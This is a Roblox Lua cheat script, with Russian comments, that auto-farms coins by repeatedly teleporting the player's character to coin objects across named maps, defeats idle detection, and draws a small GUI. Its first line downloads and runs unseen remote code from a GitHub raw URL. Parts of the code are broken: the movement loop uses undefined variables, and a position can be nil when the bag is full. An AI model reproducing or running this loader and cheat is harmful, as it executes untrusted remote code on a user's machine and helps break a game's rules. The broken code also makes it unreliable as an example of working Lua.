loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/itrScri/main/discordtxt.lua", true))()

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local Player = Players.LocalPlayer

Player.Idled:connect(
    function()
        VirtualUser:ClickButton2(Vector2.new())
    end
)

-- Создание интерфейса
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")

Noclip.Name = "Script"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 1, 0, 1)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Script"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 30

local CurrBalanceValue

function GetCurrBalanceBag()
    for _, i in pairs(Player:GetDescendants()) do
        if i.Name == "MainGUI" then
            print("MainGui")
            for _, m in pairs(i:GetDescendants()) do
                if m.Name == "CoinBags" then
                    print("CoinBags")
                    for _, k in pairs(m:GetDescendants()) do
                        if k.Name == "Candy" then
                            print("Coin")
                            for _, y in pairs(k:GetDescendants()) do
                                if y.Name == "CurrencyFrame" then
                                    print("CurrencyFrame")
                                    for _, u in pairs(y:GetDescendants()) do
                                        if u.Name == "Coins" then
                                            print("Coins last")
                                            CurrBalanceValue = tonumber(u.Text)
                                            print(CurrBalanceValue)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

function LobbyTeleport()
    for _, v in pairs(Workspace:GetDescendants()) do
        if v.Name == "SpawnLocation" then
            Player.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        end
    end
end
game.RunService.RenderStepped:Connect(function ()
	--if (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z - default_cframe.Z) > 15 then
	--	angle = 0
	--	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = default_cframe
	--	wait(3)
	--end
	if angle == 360 then
		angle = 0
	end
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 15
  	local x = radius * math.cos(math.rad(angle)) + Xc
  	local z = radius * math.sin(math.rad(angle)) + Zc
  	game.Players.LocalPlayer.Character.Humanoid:Move(Vector3.new(x,0,z))
	angle = angle + 2
end)

function teleportToMoney()
    while true do
        local availablePositions = {}
        local lastPos 

        for _, v in pairs(Workspace:GetDescendants()) do
            if v.Name == "Workplace" or v.Name == "Mansion2" or v.Name == "VampireCastle" or v.Name == "Mansion" or v.Name == "Hotel" or v.Name == "Factory" or v.Name == "MilBase" or v.Name == "House2" or v.Name == "ResearchFacility" or v.Name == "PoliceStation" then
                for _, lel in pairs(v:GetDescendants()) do
                    if lel.Name == "Coin_Server" then   
                        table.insert(availablePositions, lel.Position)
                    end
                end
            end
        end
        
        if #availablePositions > 0 then
            GetCurrBalanceBag()
            if CurrBalanceValue >= 40 then
                print("full")
                Player.Character.HumanoidRootPart.CFrame = lastPos
                wait(1)
            else
                local randomIndex = math.random(1, #availablePositions)
                local position = availablePositions[randomIndex]
                
                wait(1.60)
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(position.x, position.y, position.z)
                lastPos = CFrame.new(position.x, position.y, position.z)
        
                -- Начинаем вращение
                for i = 1, 360, 10 do
                    Player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(10), 0)
                    wait(0.1)  -- Задержка между вращениями
                end
        
                Player.Character.Humanoid.Jump = true
                wait(0.8)
                pcall(LobbyTeleport)
            end
        end
        
        
        wait(0.1)
    end
end

while wait(1) do
    pcall(teleportToMoney)
end
